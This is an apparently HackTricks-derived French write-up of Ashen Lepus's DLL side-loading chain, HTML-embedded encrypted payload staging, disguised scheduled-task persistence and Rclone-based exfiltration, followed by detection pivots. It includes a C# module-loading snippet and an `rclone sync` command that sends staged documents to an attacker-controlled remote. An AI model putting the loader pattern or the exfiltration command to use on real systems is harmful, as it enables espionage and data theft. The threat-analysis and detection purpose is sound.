# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Aperçu du tradecraft

Ashen Lepus (aka WIRTE) a industrialisé un schéma répétable qui enchaîne DLL sideloading, staged HTML payloads et backdoors modulaires .NET pour persister au sein de réseaux diplomatiques du Moyen-Orient. La technique est réutilisable par n’importe quel opérateur car elle repose sur :

- **Archive-based social engineering** : des PDFs apparemment bénins incitent les cibles à télécharger une archive RAR depuis un site de partage de fichiers. L’archive contient un EXE visionneur de documents crédible, une DLL malveillante nommée d’après une bibliothèque de confiance (par ex. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) et un leurre `Document.pdf`.
- **DLL search order abuse** : la victime double-clique sur l’EXE, Windows résout l’import de la DLL depuis le répertoire courant, et le loader malveillant (AshenLoader) s’exécute dans le processus de confiance pendant que le PDF leurre s’ouvre pour éviter les soupçons.
- **Living-off-the-land staging** : chaque étape suivante (AshenStager → AshenOrchestrator → modules) reste hors disque jusqu’à ce qu’elle soit nécessaire, livrée sous forme de blobs chiffrés cachés dans des réponses HTML par ailleurs inoffensives.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader** : l’EXE side-load AshenLoader, qui effectue de la reconnaissance hôte, chiffre AES-CTR son contenu, puis le POSTe à l’intérieur de paramètres tournants tels que `token=`, `id=`, `q=` ou `auth=` vers des chemins à apparence API (par ex. `/api/v2/account`).
2. **HTML extraction** : le C2 ne révèle l’étape suivante que lorsque l’IP client géolocalise dans la région cible et que le `User-Agent` correspond à l’implant, rendant la tâche difficile pour les sandboxes. Quand les contrôles passent, le corps HTTP contient un blob `<headerp>...</headerp>` avec le payload AshenStager chiffré en Base64/AES-CTR.
3. **Second sideload** : AshenStager est déployé avec un autre binaire légitime qui importe `wtsapi32.dll`. La copie malveillante injectée dans le binaire récupère davantage de HTML, cette fois en découpant `<article>...</article>` pour récupérer AshenOrchestrator.
4. **AshenOrchestrator** : un contrôleur modulaire .NET qui décode une config JSON en Base64. Les champs `tg` et `au` du config sont concaténés/hashés pour former la clé AES qui déchiffre `xrk`. Les octets résultants servent de clé XOR pour chaque blob de module récupéré ensuite.
5. **Module delivery** : chaque module est décrit via des commentaires HTML qui redirigent le parseur vers une balise arbitraire, contournant des règles statiques ne cherchant que `<headerp>` ou `<article>`. Les modules incluent la persistence (`PR*`), des uninstallers (`UN*`), de la reconnaissance (`SN`), la capture d’écran (`SCT`) et l’exploration de fichiers (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Même si les défenseurs bloquent ou suppriment un élément spécifique, l'opérateur n'a qu'à changer la balise indiquée dans le commentaire HTML pour reprendre la livraison.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: les loaders actuels incorporent des clés 256 bits ainsi que des nonces (p. ex., `{9a 20 51 98 ...}`) et ajoutent optionnellement une couche XOR utilisant des chaînes comme `msasn1.dll` avant/après le déchiffrement.
- **Recon smuggling**: les données énumérées incluent désormais les listings de Program Files pour repérer les applications de grande valeur et sont toujours chiffrées avant de quitter l'hôte.
- **URI churn**: les paramètres de requête et les chemins REST tournent entre les campagnes (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidant les détections fragiles.
- **Gated delivery**: les serveurs sont géo-cloisonnés et ne répondent qu'aux implants réels. Les clients non approuvés reçoivent du HTML non suspect.

## Persistence & Execution Loop

AshenStager dépose des tâches planifiées qui se font passer pour des tâches de maintenance Windows et s'exécutent via `svchost.exe`, par ex. :

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ces tâches relancent la chaîne de sideloading au démarrage ou à intervalles réguliers, garantissant qu'AshenOrchestrator peut demander de nouveaux modules sans toucher de nouveau le disque.

## Using Benign Sync Clients for Exfiltration

Les opérateurs placent des documents diplomatiques dans `C:\Users\Public` (lisible par tous et non suspect) via un module dédié, puis téléchargent le binaire légitime de [Rclone](https://rclone.org/) pour synchroniser ce répertoire avec le stockage contrôlé par l'attaquant :

1. **Stage**: copier/rassembler les fichiers cibles dans `C:\Users\Public\{campaign}\`.
2. **Configure**: déployer un fichier de configuration Rclone pointant vers un endpoint HTTPS contrôlé par l'attaquant (p. ex., `api.technology-system[.]com`).
3. **Sync**: exécuter `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` afin que le trafic ressemble à des sauvegardes cloud normales.

Parce que Rclone est largement utilisé pour des workflows de sauvegarde légitimes, les défenseurs doivent se concentrer sur les exécutions anormales (nouveaux binaires, remotes suspects, ou synchronisation soudaine de `C:\Users\Public`).

## Detection Pivots

- Alerter sur les **processus signés** qui chargent de façon inattendue des DLL depuis des chemins modifiables par l'utilisateur (filtres Procmon + `Get-ProcessMitigation -Module`), surtout lorsque les noms de DLL se superposent avec `netutils`, `srvcli`, `dwampi`, ou `wtsapi32`.
- Inspecter les réponses HTTPS suspectes pour des **gros blobs Base64 intégrés dans des balises inhabituelles** ou protégés par des commentaires `<!-- TAG: <xyz> -->`.
- Rechercher des **tâches planifiées** qui exécutent `svchost.exe` avec des arguments non liés aux services ou qui renvoient aux répertoires du dropper.
- Surveiller l'apparition de binaires **Rclone** en dehors des emplacements gérés par l'IT, de nouveaux fichiers `rclone.conf`, ou de tâches de synchronisation qui tirent depuis des répertoires de staging comme `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
